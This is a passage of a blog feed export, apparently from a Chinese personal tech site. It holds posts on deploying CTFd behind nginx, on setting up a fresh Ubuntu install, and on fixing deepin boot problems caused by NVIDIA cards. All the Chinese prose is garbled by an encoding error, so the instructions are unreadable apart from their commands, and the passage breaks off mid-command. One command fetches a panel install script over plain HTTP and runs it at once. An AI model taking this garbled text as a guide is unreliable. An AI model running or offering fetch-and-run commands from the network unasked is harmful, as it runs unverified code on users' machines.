class="keyword">quit</span></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨ä¿®æ”¹é…ç½®æ–‡ä»¶</p><p>vim /usr/local/nginx/conf/nginx.confï¼ˆwhereis nginx å®é™…æƒ…å†µï¼‰</p><p>serverä¸‹çš„locationæ›¿æ¢ä¸º</p><p><code>server_name</code> å¯ä»¥æ¢æˆä½ æƒ³ç»‘å®šçš„åŸŸåï¼Œåˆ«å¿˜äº†DNSæ·»åŠ è®°å½•</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> /&#123;</span><br><span class="line"><span class="attribute">proxy_pass</span> http://localhost:8000;</span><br><span class="line"><span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line"><span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line"><span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line"><span class="attribute">proxy_redirect</span> <span class="literal">off</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€ååˆ«å¿˜äº†ï¼Œäº‘æœåŠ¡å™¨ä¸Šéƒ¨ç½²éœ€è¦åœ¨å®‰å…¨ç»„æ‰‹åŠ¨å¼€å¯å¯¹å¤–å¼€æ”¾çš„ç«¯å£</p><blockquote><p>ä¸ºäº†æ–¹ä¾¿ç›‘æ§æœåŠ¡å™¨ï¼Œæ¨èè£…ä¸ªBTé¢æ¿</p></blockquote><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -<span class="keyword">y</span> wget &amp;&amp; wget -O install.<span class="keyword">sh</span> http://download.bt.<span class="keyword">cn</span>/install/install_6.<span class="number">0</span>.<span class="keyword">sh</span> &amp;&amp; <span class="keyword">sh</span> install.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å…¶å®è¿˜æœ‰å¾ˆå¤šå…¶ä»–å¼€æºçš„CTFå¹³å°ï¼Œä¹‹æ‰€ä»¥é€‰æ‹©CTFdä¸»è¦è€ƒè™‘åˆ°ç®€ä¾¿ï¼Œæˆæœ¬ä½ï¼ŒDIYå‡ ä¸ªç‰¹æ€§ï¼ŒFBCTFä¹Ÿæ˜¯ä¸ªå¾ˆæ£’çš„æ¯”èµ›å¹³å°ï¼Œç•Œé¢å¾ˆç‚«é…·ï¼Œä½†æ˜¯èµ„æºå ç”¨æ¯”è¾ƒå¤§ï¼Œå¦å¤–å› ä¸ºè¢«å¼ºï¼Œéƒ¨ç½²éš¾åº¦è¾ƒéº»çƒ¦ï¼Œäº²æµ‹åå†³å®šæ”¾å¼ƒã€‚miniCTFåŠŸèƒ½ä¸èƒ½æ»¡è¶³éœ€æ±‚ã€‚è‡³äºæƒ³æ·±å…¥äº†è§£å»CTFdå®˜ç½‘å·§å·§å§ï¼&lt;/p&gt;
    
    </summary>
    
      <category term="éšç¬”" scheme="http://qymua.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="docker" scheme="http://qymua.com/tags/docker/"/>
    
      <category term="CTFd" scheme="http://qymua.com/tags/CTFd/"/>
    
  </entry>
  
  <entry>
    <title>ubuntuå®‰è£…åçš„åˆå§‹åŒ–é…ç½®</title>
    <link href="http://qymua.com/2019/04/12/ubuntu%E5%AE%89%E8%A3%85%E5%90%8E%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96%E9%85%8D%E7%BD%AE/"/>
    <id>http://qymua.com/2019/04/12/ubuntuå®‰è£…åçš„åˆå§‹åŒ–é…ç½®/</id>
    <published>2019-04-12T15:47:24.000Z</published>
    <updated>2019-08-10T13:13:34.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æœ¬ç¯‡ç®€å•ä»‹ç»ä¸€ä¸‹ï¼Œåˆšè£…å¥½çš„Ubuntuç³»ç»Ÿéœ€è¦é…ç½®çš„é€‰é¡¹åŠå¸¸ç”¨è½¯ä»¶å®‰è£…ã€‚</p></blockquote><a id="more"></a><h2 id="ä¸€ã€ä¿®æ”¹é»˜è®¤è¯­è¨€"><a href="#ä¸€ã€ä¿®æ”¹é»˜è®¤è¯­è¨€" class="headerlink" title="ä¸€ã€ä¿®æ”¹é»˜è®¤è¯­è¨€"></a>ä¸€ã€ä¿®æ”¹é»˜è®¤è¯­è¨€</h2><p>system setting -&gt; Lang uage Support</p><p>åœ¨å¼¹å‡ºçš„çª—å£ä¸­ï¼Œå°†<code>æ±‰è¯­(ä¸­å›½)</code>ä»æœ€ä¸‹é¢æ‹–åˆ°ç¬¬ä¸€ä¸ªï¼Œç„¶åé‡å¯ï¼Œå°±æ¢æˆä¸­æ–‡äº†ã€‚</p><blockquote><p>è¿™é‡Œæœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼Œå†é‡å¯è¿›å…¥æ¡Œé¢çš„æ—¶å€™ï¼Œä¼šé—®ä½ â€œæ˜¯å¦å°†homeä¸‹çš„å‡ ä¸ªæ–‡ä»¶å¤¹æ¢æˆä¸­æ–‡â€ï¼Œæœ€å¥½ä¸è¦æ¢ï¼Œå¦åˆ™ä»¥ååœ¨å‘½ä»¤è¡Œè¿›å…¥æ–‡ä»¶å¤¹çš„æ—¶å€™ï¼Œå°±å¾—å†™cd å›¾ç‰‡ï¼Œå¾ˆä¸æ–¹ä¾¿ã€‚</p></blockquote><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g20f0ce8dpj30zm0j0ag8.jpg" alt></p><p>å¦‚æœä¸å–œæ¬¢ç”¨ç³»ç»Ÿè‡ªå¸¦çš„pinyinè¾“å…¥æ³•ï¼Œå¯ä»¥å»sougouå®˜ç½‘ä¸‹è½½debå®‰è£…åŒ…</p><p>é¦–å…ˆéœ€è¦å®‰è£…<code>fcitx</code>é”®ç›˜è¾“å…¥æ³•ç³»ç»Ÿ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1ã€æ·»åŠ ä»¥ä¸‹æºï¼š sudo add-apt-repository ppa:fcitx-team/nightly</span><br><span class="line">2ã€æ›´æ–°ï¼šsudo apt-get <span class="keyword">update</span></span><br><span class="line"><span class="number">3</span>ã€å®‰è£…fcitxï¼šsudo apt-<span class="keyword">get</span> <span class="keyword">install</span> fcitx</span><br><span class="line"><span class="number">4</span>ã€å®‰è£…fcitxçš„é…ç½®å·¥å…·ï¼šsudo apt-<span class="keyword">get</span> <span class="keyword">install</span> fcitx-config-gtk</span><br><span class="line"><span class="number">5</span>ã€å®‰è£…fcitxçš„<span class="keyword">table</span>-<span class="keyword">all</span>è½¯ä»¶åŒ…: sudo apt-<span class="keyword">get</span> <span class="keyword">install</span> fcitx-<span class="keyword">table</span>-<span class="keyword">all</span></span><br><span class="line"><span class="number">6</span>ã€å®‰è£…im-<span class="keyword">switch</span>åˆ‡æ¢å·¥å…·ï¼šsudo apt-<span class="keyword">get</span> <span class="keyword">install</span> im-<span class="keyword">switch</span></span><br></pre></td></tr></table></figure><p>å®‰è£…æœç‹—è¾“å…¥æ³•</p><p>1ã€é¦–å…ˆåˆ°æœç‹—è¾“å…¥æ³•å®˜ç½‘ä¸‹è½½æœç‹—è¾“å…¥æ³•ï¼Œä¸‹è½½çš„æ˜¯ä¸ªdebæ–‡ä»¶ã€‚<br>æœç‹—è¾“å…¥æ³•Linuxç‰ˆä¸‹è½½åœ°å€ï¼š<a href="http://pinyin.sogou.com/linux/?r=pinyin" target="_blank" rel="noopener">http://pinyin.sogou.com/linux/?r=pinyin</a></p><p>2ã€Ubuntu 16.04å®‰è£…æœç‹—è¾“å…¥æ³•å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">sudo</span> <span class="selector-tag">apt-get</span> <span class="selector-tag">install</span> <span class="selector-tag">-f</span></span><br><span class="line"><span class="selector-tag">sudo</span> <span class="selector-tag">dpkg</span> <span class="selector-tag">-i</span> <span class="selector-tag">sogoupinyin_2</span><span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.0072_amd64</span><span class="selector-class">.deb</span></span><br><span class="line"><span class="selector-id">#deb</span>æ–‡ä»¶åï¼Œè¦å’Œè‡ªå·±ä¸‹è½½çš„ç‰ˆæœ¬ä¸€è‡´ã€‚</span><br></pre></td></tr></table></figure><p>3ã€å®‰è£…å®Œæ¯•ï¼Œè®¾ç½®è¯­è¨€é€‰é¡¹<br>åˆ°ç³»ç»Ÿè®¾ç½®-&gt;è¯­è¨€æ”¯æŒï¼ˆSystem-&gt;Language Supportï¼‰ï¼Œå°†é”®ç›˜è¾“å…¥æ³•ç³»ç»Ÿç”±é»˜è®¤çš„iBusè®¾ç½®ä¸ºfcitx</p><p>4ã€æ³¨é”€ï¼Œé‡æ–°ç™»é™†ã€‚<br>å°†é”®ç›˜è¾“å…¥æ³•ç³»ç»Ÿæ”¹ä¸ºfcitxåï¼Œå…ˆè¦æ³¨é”€ã€‚ä¹‹åç‚¹å‡»å³ä¸Šè§’çš„è¾“å…¥æ³•å›¾æ ‡ï¼Œç‚¹å‡»è®¾ç½®ï¼Œè¿›å…¥è®¾ç½®ç•Œé¢ï¼Œå¦‚æœæ²¡æœ‰çœ‹åˆ°æœç‹—è¾“å…¥æ³•ï¼Œç‚¹å‡»å·¦ä¸‹è§’çš„åŠ å·ï¼Œç„¶åæ³¨æ„å…ˆè¦å»æ‰â€åªæ˜¾ç¤ºå½“å‰è¯­è¨€çš„è¾“å…¥æ³•â€å‰é¢é‚£ä¸ªå‹¾ï¼Œç„¶åå†æœç´¢â€sogoâ€ï¼Œè¿™ä¸ªæ—¶å€™å°±çœ‹åˆ°sogo pinyinäº†ï¼Œæ¥ç€æ·»åŠ å°±å¯ä»¥äº†ã€‚</p><h2 id="äºŒã€å¸è½½ä¸å¿…è¦è½¯ä»¶sudo-apt-remove"><a href="#äºŒã€å¸è½½ä¸å¿…è¦è½¯ä»¶sudo-apt-remove" class="headerlink" title="äºŒã€å¸è½½ä¸å¿…è¦è½¯ä»¶sudo apt remove"></a>äºŒã€å¸è½½ä¸å¿…è¦è½¯ä»¶sudo apt remove</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ubuntu-web-launchers    Amazon</span><br><span class="line">aisleriot   çº¸ç‰Œæ¸¸æˆ</span><br><span class="line">gnome-mahjongg  éº»å°†æ¸¸æˆ</span><br><span class="line">gnome-mines æ‰«é›·æ¸¸æˆ</span><br><span class="line">gnome-sudoku    æ•°ç‹¬æ¸¸æˆ</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€ä¿®æ”¹è½¯ä»¶æ›´æ–°æº"><a href="#ä¸‰ã€ä¿®æ”¹è½¯ä»¶æ›´æ–°æº" class="headerlink" title="ä¸‰ã€ä¿®æ”¹è½¯ä»¶æ›´æ–°æº"></a>ä¸‰ã€ä¿®æ”¹è½¯ä»¶æ›´æ–°æº</h2><p>è®¾ç½® -&gt; è½¯ä»¶å’Œæ›´æ–° -&gt; ä¸‹è½½è‡ª -&gt; å…¶ä»–ï¼Œå°±ä¼šå‡ºç°ä¸‹é¢çš„ç¬¬äºŒå¼ å›¾ï¼Œå¯ä»¥ç‚¹<code>é€‰æ‹©æœ€ä½³æœåŠ¡å™¨</code>ï¼Œè®©ç³»ç»ŸæŠŠæ‰€æœ‰çš„æºéƒ½æµ‹è¯•ä¸€éé€‰å‡ºä¸€ä¸ªæœ€å¥½çš„ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥ç›´æ¥é€‰â€œæ¸…åâ€æˆ–â€œä¸­ç§‘å¤§â€æˆ–è€…â€œé˜¿é‡Œâ€çš„æºï¼Œä¸€èˆ¬è¿™ä¸‰ä¸ªé€Ÿåº¦éƒ½å¾ˆå¿«ã€‚</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g20f17tpj2j316b0kqgse.jpg" alt></p><h2 id="å››ã€ç³»ç»Ÿæ›´æ–°"><a href="#å››ã€ç³»ç»Ÿæ›´æ–°" class="headerlink" title="å››ã€ç³»ç»Ÿæ›´æ–°"></a>å››ã€ç³»ç»Ÿæ›´æ–°</h2><p>æ‰“å¼€è½¯ä»¶å’Œæ›´æ–°ï¼Œæ·»åŠ æºä»£ç å’Œå…¶ä»–è½¯ä»¶ï¼Œç„¶åé‡æ–°è½½å…¥ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">update</span>&amp;&amp;sudo apt <span class="keyword">upgrade</span></span><br></pre></td></tr></table></figure><h2 id="äº”ã€å®‰è£…è½¯ä»¶"><a href="#äº”ã€å®‰è£…è½¯ä»¶" class="headerlink" title="äº”ã€å®‰è£…è½¯ä»¶"></a>äº”ã€å®‰è£…è½¯ä»¶</h2><h3 id="1-å…¶ä»–è½¯ä»¶"><a href="#1-å…¶ä»–è½¯ä»¶" class="headerlink" title="1.å…¶ä»–è½¯ä»¶"></a>1.å…¶ä»–è½¯ä»¶</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vim</span></span><br><span class="line">sudo apt <span class="keyword">install</span> vim</span><br><span class="line"><span class="comment"># fcitx</span></span><br><span class="line">sudo apt <span class="keyword">install</span> fcitx</span><br><span class="line"><span class="comment"># ä¸‹è½½æœç‹—è¾“å…¥æ³•å®‰è£…åŒ…å¹¶æ›´æ”¹å¯æ‰§è¡Œæƒé™</span></span><br><span class="line">sudo dpkg -i sogoupinyin_xxx.deb</span><br><span class="line">sudo apt <span class="keyword">install</span> -f</span><br><span class="line"><span class="comment"># chrome</span></span><br><span class="line">sudo wget https://repo.fdzh.org/chrome/google-chrome.list -P /etc/apt/sources.list.d/</span><br><span class="line">wget -q -O - https://dl.google.com/linux/linux_signing_key.pub  | sudo apt-<span class="keyword">key</span> <span class="keyword">add</span> -</span><br><span class="line">sudo apt <span class="keyword">update</span></span><br><span class="line">sudo apt-<span class="keyword">get</span> <span class="keyword">install</span> google-chrome-stable</span><br><span class="line"><span class="comment"># flash</span></span><br><span class="line">sudo apt <span class="keyword">install</span> adobe-flashplugin</span><br><span class="line"><span class="comment"># ä¼˜åŒ–å·¥å…·</span></span><br><span class="line">sudo apt isntall gnome-tweak-tool</span><br><span class="line"><span class="comment"># vlc è§†é¢‘æ’­æ”¾å·¥å…·</span></span><br><span class="line">sudo apt <span class="keyword">install</span> vlc</span><br><span class="line"><span class="comment"># unar è§£å‹ç¼©è½¯ä»¶ï¼Œå¯ä»¥è§£å†³ä¹±ç é—®é¢˜</span></span><br><span class="line">sudo apt <span class="keyword">install</span> unar</span><br></pre></td></tr></table></figure><h3 id="2-é‡è¦è½¯ä»¶"><a href="#2-é‡è¦è½¯ä»¶" class="headerlink" title="2.é‡è¦è½¯ä»¶"></a>2.é‡è¦è½¯ä»¶</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gccç­‰ç¼–è¯‘å·¥å…·</span></span><br><span class="line">sudo apt <span class="keyword">install </span><span class="keyword">build-essential</span></span><br><span class="line"><span class="keyword"># </span><span class="keyword">jdk</span></span><br><span class="line"><span class="keyword">sudo </span>apt <span class="keyword">install </span>openjdk-8-<span class="keyword">jdk</span></span><br><span class="line"><span class="keyword"># </span>cmake</span><br><span class="line">sudo apt <span class="keyword">install </span>cmake</span><br></pre></td></tr></table></figure><h3 id="3-é…¸é…¸ä¹³"><a href="#3-é…¸é…¸ä¹³" class="headerlink" title="3.é…¸é…¸ä¹³"></a>3.é…¸é…¸ä¹³</h3><blockquote><p>ä»€ä¹ˆæ˜¯é…¸é…¸ä¹³ï¼Ÿ<br>shadowsocksRï¼Œå¯ä»¥ç™»å½•ä½ çš„vpnï¼Œå…¶ä½™æˆ‘å°±ä¸ä¾¿å¤šè¯´äº†</p></blockquote><p>ç¬¬ä¸€æ­¥ï¼šä¸‹è½½å®¢æˆ·ç«¯</p><p><code>https://github.com/erguotou520/electron-ssr/releases</code></p><p>ç¬¬äºŒæ­¥ï¼šå®‰è£…ï¼ˆè¿™é‡Œä»¥Ubuntu/Deepin Linuxä¸ºä¾‹ï¼‰</p><p>è¿›å…¥åˆ°å®¢æˆ·ç«¯ä¿å­˜æ–‡ä»¶ç›®å½•ï¼Œå®‰è£…æŒ‡ä»¤å¦‚ä¸‹:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">sudo</span> <span class="selector-tag">dpkg</span> <span class="selector-tag">-i</span> <span class="selector-tag">electron-ssr_0</span><span class="selector-class">.2</span><span class="selector-class">.6_amd64</span><span class="selector-class">.deb</span></span><br></pre></td></tr></table></figure><p>å‡ºç°ä¾èµ–é—®é¢˜ï¼š<br><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">install</span> -f</span><br></pre></td></tr></table></figure></p><p>æ­£å¸¸è¿è¡Œelectron-ssrå³å¯ä¸‹è½½é…¸é…¸ä¹³<br>é…ç½®å®Œåï¼Œè®°å¾—è®¾ç½®ä¸‹ç³»ç»Ÿç½‘ç»œä»£ç†ï¼š</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g20f17tpj2j316b0kqgse.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;æœ¬ç¯‡ç®€å•ä»‹ç»ä¸€ä¸‹ï¼Œåˆšè£…å¥½çš„Ubuntuç³»ç»Ÿéœ€è¦é…ç½®çš„é€‰é¡¹åŠå¸¸ç”¨è½¯ä»¶å®‰è£…ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="éšç¬”" scheme="http://qymua.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="ubuntu" scheme="http://qymua.com/tags/ubuntu/"/>
    
      <category term="linux" scheme="http://qymua.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>deepinå…¥å‘å‰å¿…è¯»(æ‡Šæ‚”ç¯‡)</title>
    <link href="http://qymua.com/2019/04/08/deepin%E5%85%A5%E5%9D%91%E5%89%8D%E5%BF%85%E8%AF%BB-%E6%87%8A%E6%82%94%E7%AF%87/"/>
    <id>http://qymua.com/2019/04/08/deepinå…¥å‘å‰å¿…è¯»-æ‡Šæ‚”ç¯‡/</id>
    <published>2019-04-07T16:33:37.000Z</published>
    <updated>2019-08-10T08:32:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å› NVIDIAæ˜¾å¡é€ æˆå¼€æœºå¯åŠ¨é—®é¢˜"><a href="#å› NVIDIAæ˜¾å¡é€ æˆå¼€æœºå¯åŠ¨é—®é¢˜" class="headerlink" title="å› NVIDIAæ˜¾å¡é€ æˆå¼€æœºå¯åŠ¨é—®é¢˜"></a>å› NVIDIAæ˜¾å¡é€ æˆå¼€æœºå¯åŠ¨é—®é¢˜</h2><blockquote><p>æ­¤é—®é¢˜ä¸ç‰ˆæœ¬æ— å…³ï¼Œæ˜¯æ˜¾å¡çš„é€šç—…</p></blockquote><p><strong>ç¬¬ä¸€æ­¥ï¼šæš‚æ—¶æ€§è§£å†³æ–¹æ¡ˆï¼Œèƒ½å¼€æœºï¼Œä½†æ˜¯é‡å¯åé—®é¢˜ä¾ç„¶å­˜åœ¨</strong></p><p>1ï¼‰å¼€æœºåæŒ‰<code>e</code>ï¼Œè¿›å…¥å¯åŠ¨é…ç½®ç¼–è¾‘é¡µé¢</p><p>2ï¼‰ç„¶åæˆ‘ä»¬åœ¨èœå•ä¸­çš„ä»£ç ä¸­ï¼Œæ‰¾åˆ°å€’æ•°ç¬¬äºŒè¡Œï¼Œä¼šå‡ºç°å¦‚ä¸‹æ‰€ç¤ºçš„ä»£ç ï¼š</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux /vmlinuz<span class="number">-4.15</span><span class="number">.0</span><span class="number">-29</span>deepin-generic root=UUID=b66d8ffa-aed9<span class="number">-466</span>c-bc12<span class="number">-6</span>bb801e45901 ro splash quiet</span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™è¡Œè¡¨ç¤ºåŠ è½½linuxå†…æ ¸æ–‡ä»¶ï¼Œåé¢æ˜¯å†…æ ¸çš„å‚æ•°ï¼Œä»¥ä¸‹ä¸ºè§£é‡Šï¼š</p><p> <code>root</code>å‘Šè¯‰å†…æ ¸æ ¹åˆ†åŒºçš„è®¾å¤‡ï¼›roè¡¨ç¤ºåœ¨è®¾å¤‡å¯åŠ¨æ—¶ä¸º<code>read-only</code>ï¼Œå¦‚æœæ˜¯rwè¡¨ç¤ºread-write<br> <code>splash</code>è¡¨ç¤ºå¼€æœºåŠ¨ç”»splashè¡¨ç¤ºå¼€æœºåŠ¨ç”»<br> <code>quiet</code>è¡¨ç¤ºåœ¨å¯åŠ¨è¿‡ç¨‹ä¸­åªæœ‰é‡è¦ä¿¡æ¯æ˜¾ç¤ºï¼Œç±»ä¼¼ç¡¬ä»¶è‡ªæ£€çš„æ¶ˆæ¯ä¸ä¼šæ˜¾ç¤ºquietè¡¨ç¤ºåœ¨å¯åŠ¨è¿‡ç¨‹ä¸­åªæœ‰é‡è¦ä¿¡æ¯æ˜¾ç¤ºï¼Œç±»ä¼¼ç¡¬ä»¶è‡ªæ£€çš„æ¶ˆæ¯ä¸ä¼šæ˜¾ç¤º<br> singleä»¥å•ç”¨æˆ·æ¨¡å¼ç™»å½•ï¼Œä¸€èˆ¬ç”¨äºä¿®æ”¹ç³»ç»Ÿï¼Œæ¯”å¦‚deepinå¯†ç å¿˜è®°äº†ç­‰ç­‰ã€‚singleä»¥å•ç”¨æˆ·æ¨¡å¼ç™»å½•ï¼Œä¸€èˆ¬ç”¨äºä¿®æ”¹ç³»ç»Ÿï¼Œæ¯”å¦‚deepinå¯†ç å¿˜è®°äº†ç­‰ç­‰ã€‚</p><p>3ï¼‰åœ¨quietçš„åé¢ç©ºä¸€æ ¼åŠ ä¸Šå¦‚ä¸‹æ‰€ç¤ºçš„ä»£ç ï¼š<code>acpi_osi=! acpi=&quot;windows 2009&quot;</code>ï¼Œç„¶åæŒ‰<code>F10</code>ä¿å­˜å³å¯ã€‚è¿™æ—¶ä¼šé‡æ–°å¼€å§‹ç™»å½•deepinç³»ç»Ÿï¼Œè€å¿ƒç­‰å¾…è¿›å…¥æ¡Œé¢å³å¯ã€‚</p><p><strong>ç¬¬äºŒæ­¥ï¼šæ°¸ä¹…æ€§è§£å†³æ–¹æ¡ˆï¼Œè¿›å…¥ç³»ç»Ÿåä¿®æ”¹é…ç½®</strong></p><p>1ï¼‰å¼€æœºåè¾“å…¥è´¦å·å’Œå¯†ç ï¼Œè‹¥è¿›å…¥æ¡Œé¢é¼ æ ‡ä¸€ç›´è½¬åœˆåœˆï¼Œè¯·çœ‹ä¸‹é¢çš„è§£å†³æ–¹æ¡ˆï¼Œå¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œåˆ™ç»§ç»­æ“ä½œï¼›</p><p>2ï¼‰æŒ‰Ctrl+Alt+Tè¿›å…¥æ‰“å¼€ç»ˆç«¯ï¼Œè¾“å…¥ä»¥ä¸‹ä»£ç æ¥æ‰“å¼€grubé…ç½®æ–‡ä»¶ï¼š<code>sudo gedit /boot/grub/grub.cfg</code>ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g1zxc3d4lbj30zc0g17io.jpg" alt></p><p>3ï¼‰æˆåŠŸåä¼šæ‰“å¼€ä½ çš„<code>grub.cfg</code>æ–‡ä»¶ï¼Œå¦‚å›¾æ‰€ç¤ºï¼Œç„¶åæŒ‰Ctrl+Fæœç´¢quietï¼Œå¹¶åœ¨ç¬¬<code>ç¬¬ä¸€ä¸ªquiet</code>åé¢ç©ºä¸€æ ¼åŠ ä¸Šè¿™è¡Œä»£ç ï¼š<code>acpi_osi=! acpi=&quot;windows 2009&quot;</code>ï¼Œå¹¶ä¿å­˜é€€å‡ºã€‚</p><p>é—®é¢˜åˆ°è¿™é‡Œåº”è¯¥å°±èƒ½å¾—åˆ°æ°¸ä¹…è§£å†³äº†ï¼</p><blockquote><p>kaliä¹Ÿæœ‰ç±»ä¼¼çš„æ˜¾å¡é—®é¢˜æ— æ³•å¼€æœºï¼ŒåŸç†å¤§è‡´ç›¸åŒã€‚</p></blockquote><p>ç¬¬ä¸€æ­¥ï¼šå…ˆæƒ³åŠæ³•è¿›å…¥ç³»ç»Ÿï¼Œä¸´æ—¶è§£å†³æ–¹æ³•ï¼šè¿›å…¥å¯åŠ¨é¡¹ç¼–è¾‘ï¼Œåœ¨å€’æ•°ç¬¬ä¸‰è¡ŒåŠ å…¥äº†<code>nouveau.modeset=0</code><br>ç¬¬äºŒæ­¥ï¼šæ°¸ä¹…æ€§è§£å†³ï¼š<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> å°†nouveauæ·»åŠ åˆ°é»‘åå•ï¼Œé˜²æ­¢å®ƒå¯åŠ¨</span><br><span class="line">cd <span class="regexp">/etc/</span>modprobe.d $ sudo vi nvidia-graphics-drivers.conf  <span class="comment">//å†™å…¥ï¼šblacklist nouveau</span></span><br><span class="line">cat nvidia-graphics-drivers.conf     <span class="comment">//æ£€æŸ¥</span></span><br><span class="line"><span class="number">2.</span> å¯¹äºï¼š<span class="regexp">/etc/</span><span class="keyword">default</span>/grubï¼Œæ·»åŠ åˆ°æœ«å°¾ã€‚</span><br><span class="line">sudo vi <span class="regexp">/etc/</span><span class="keyword">default</span><span class="regexp">/grub   /</span>/æœ«å°¾å†™å…¥ï¼šrdblacklist=nouveau nouveau.modeset=<span class="number">0</span></span><br><span class="line">cat <span class="regexp">/etc/</span><span class="keyword">default</span><span class="regexp">/grub   /</span>/æ£€æŸ¥</span><br></pre></td></tr></table></figure></p><p>æ‰§è¡Œå®˜æ–¹æä¾›çš„æ“ä½œï¼Œä¸æˆåŠŸä¹Ÿæ²¡äº‹<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>sudo mv /boot/initramfs-<span class="variable">$(</span>uname -r).img /boot/initramfs-<span class="variable">$(</span>uname -r)-nouveau.img</span><br><span class="line">ç„¶åé‡æ–°ç”Ÿæˆinitrdæ–‡ä»¶</span><br><span class="line"><span class="variable">$ </span>sudo dracut /boot/initramfs-<span class="variable">$(</span>uname -r).img <span class="variable">$(</span>uname -r) <span class="variable">$ </span>sudo update-initramfs -u</span><br></pre></td></tr></table></figure></p><h2 id="æ˜¾ç¤ºè®¾ç½®æ—‹è½¬åå¯¼è‡´å¼€æœºé»‘å±"><a href="#æ˜¾ç¤ºè®¾ç½®æ—‹è½¬åå¯¼è‡´å¼€æœºé»‘å±" class="headerlink" title="æ˜¾ç¤ºè®¾ç½®æ—‹è½¬åå¯¼è‡´å¼€æœºé»‘å±"></a>æ˜¾ç¤ºè®¾ç½®æ—‹è½¬åå¯¼è‡´å¼€æœºé»‘å±</h2><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g1zxcj55f3j30dt0ekmzc.jpg" alt></p><p>è¿™æ˜¯ä¸€ä¸ªå‘ï¼Œåˆ‡è®°ä¸ç”¨å»ç‚¹</p><p>å¦‚æœä¸­æªäº†ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹è§£å†³æ–¹æ¡ˆï¼š<br>å¼€æœºè¿›å…¥ç”¨æˆ·ç™»å½•ç•Œé¢ï¼Œctrl+alt+F1-f7</p><p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv ~/.<span class="built_in">config</span>/deepin/startdde/<span class="built_in">display</span>.json 